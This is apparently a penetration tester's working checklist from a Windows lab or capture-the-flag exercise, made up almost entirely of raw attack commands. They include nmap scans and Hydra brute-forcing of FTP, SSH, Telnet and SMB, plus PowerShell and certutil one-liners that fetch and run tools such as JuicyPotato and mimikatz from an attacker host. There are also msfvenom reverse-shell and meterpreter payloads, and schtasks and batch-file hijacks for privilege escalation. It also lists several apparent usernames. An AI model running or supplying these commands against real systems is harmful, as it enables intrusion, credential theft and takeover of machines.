(checklist)

sudo nmap -sn 192.168.1.0/2
sudo nmap -sn 192.168.1.0/24 |grep "report for" | cut -d " " -f 5 > ip.txt

- sudo nmap -p- -iL ip.txt -oA Port-Scan-TCP
- sudo nmap -sS -sV -p- -iL ip.txt -oA Service-Version-Scan
- sudo nmap -sC -sV -p- -iL ip.txt -oA Default-Version-Scan

Brute Force (Hydra):
FTP:
sudo hydra -L users.txt -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt ftp://192.168.121.143

SSH:
sudo hydra -L users.txt -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt ssh://192.168.121.143

Telnet:
sudo hydra -L users.txt -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt telnet://192.168.121.143

SMB:
sudo hydra -L users.txt -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt smb://192.168.121.143

COMMANDS:
LAB:
Check for Autorun Mechanisms (Windows)
On Windows, certain features can automatically execute files when placed in certain folders. These include:

Startup Folder: Any executable placed in the Startup folder will automatically run when a user logs in.
File System Hooking/Executable File Execution (e.g., via registry): Windows has mechanisms for automatically running executable files in certain directories, especially in shared or "networked" directories.

GuideM{LangSAKALAM.Yccyy}
C:\Users\restam\Desktop>type guidem.txt.txt
type guidem.txt.txt
GuideM{LangSAKALAM.Yccyy}

GET /login HTTP/1.1
Host: 192.168.121.142
Cache-Control: max-age=0
Authorization: Basic Base64(username:password)
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: HFS_SID=0.806552948895842
Connection: close


echo IEX(New-Object Net.WebClient).DownloadString('http://192.168.121.131:8084/Sherlock.ps1') | powershell -noprofile -

windows/x64/meterpreter/reverse_tcp

C:\Windows\System32>wmic service get name,pathname,startmode |findstr /i  /v C:\Windows\\
wmic service get name,pathname,startmode |findstr /i  /v C:\Windows\\
ERROR:
Description = Access denied

HostName:                             PROJECT
TaskName:                             \get and run
Next Run Time:                        N/A
Status:                               Running
Logon Mode:                           Interactive/Background
Last Run Time:                        12/12/2024 1:53:31 AM
Last Result:                          -2147216609
Author:                               COUNT-PROJECT\gerard
Task To Run:                          C:\Users\resty\Documents\getandrun.bat 
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode
Run As User:                          COUNT-PROJECT\restam
Delete Task If Not Rescheduled:       Enabled

cacls "C:\Users\resty\Documents\getandrun.bat"
C:\Users\resty\Documents\getandrun.bat NT AUTHORITY\SYSTEM:(I)(F)
                                        BUILTIN\Administrators:(I)(F)
                                        COUNT-PROJECT\resty:(I)(F)

daniel-gallego
francisco-andrade
donna-stroupe
ketut-susilo
beth-delow
john-maestro
winona-bran


certutil -urlcache -f http://192.168.121.131:8084/JuicyPotato.exe JuicyPotato.exe

certutil -urlcache -f http://192.168.121.131:8081/mimikatz.exe mimikatz.exe

C:\Users\neil.tran\Desktop\JuicyPotato.exe -ip 192.168.121.143 -cmd "C:\Users\neil.tran\Downloads\potato_reverse_4447.exe" -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true

runas /user:Administrator C:\Users\neil.tran\Desktop\JuicyPotato.exe -t u -p "C:\Users\neil.tran\Downloads\potato_reverse_4447.exe" -l 4447 -m 192.168.121.143


echo IEX(New-Object Net.WebClient).DownloadString('http://192.168.121.143:8084/Sherlock.ps1') | powershell -noprofile -


accesschk64.exe "INTERACTIVE" -kvuqsw hklm\System\CurrentControlSet\services

potato.exe -ip 192.168.121.142 -cmd “C:\Users\neil.tran\Downloads\reverse.exe”-enable_httpserver true -enable_defender true  -enable_spoof true -enable_exhaust true

accesschk64.exe -uwcv neil.tran *

accesschk64.exe -ucqv neil.tran /accepteula Rejetto

accesschk64.exe -wvu "c:\tools\srvany.exe"

accesschk64.exe -wvu "C:\Users\neil.tran\Documents\getandrun.bat"


accesschk64.exe "Users" -kvuqsw hklm\System\CurrentControlSet\services

accesschk64.exe -uwcv neil.tran *

reverse_payload - 4445
geraint_payload.exe - 4448
priv_payload.exe - 4449

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.121.131 LPORT=4447 -f exe -o payload_restam_4444.exe

msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.121.131 lport=4447 -f exe -o payload_restam_4444.exe

echo @echo off > C:\Users\neil.tran\Documents\getandrun.bat
echo start C:\Users\neil.tran\Documents\tran_payload.exe >> C:\Users\neil.tran\Documents\getandrun.bat

C:\Users\neil.tran\Documents\getandrun.bat

schtasks /change /tn "\Microsoft\Windows\Defrag\ScheduledDefrag" /tr "C:\Users\restam\Documents\admin_payload.exe"
schtasks /create /tn "MyReverseShellTask" /tr "C:\Users\restam\Documents\admin_payload.exe" /sc once /st 00:00 /ru SYSTEM

schtasks /change /tn "\Microsoft\Windows\Server Manager\ServerManager" /tr "C:\Users\restam\Documents\admin_payload.exe"
schtasks /create /tn "MyReverseShellTask" /tr "C:\Users\restam\Documents\admin_payload.exe" /sc onlogon /ru "geraint" /f



accesschk64.exe -ucqv geraint /accepteula wuauserv

@echo off
certutil -urlcache -f http://192.168.121.131:8081/payload_neil_4446.exe C:\Users\neil.tran\Documents\payload_neil_4446.exe
C:\Users\neil.tran\Documents\payload_neil_4446.exe



icacls "C:\Microsoft\Windows\Power Efficiency Diagnostics\AnalyzeSystem"




C:\Users\restam\Downloads\accesschk64.exe -wvu "C:\Windows\System32" /accepteula -s
icacls "C:\Windows\System32"
schtasks /query /fo LIST /v
icacls "C:\Users\restam\Documents\getandrun.bat"





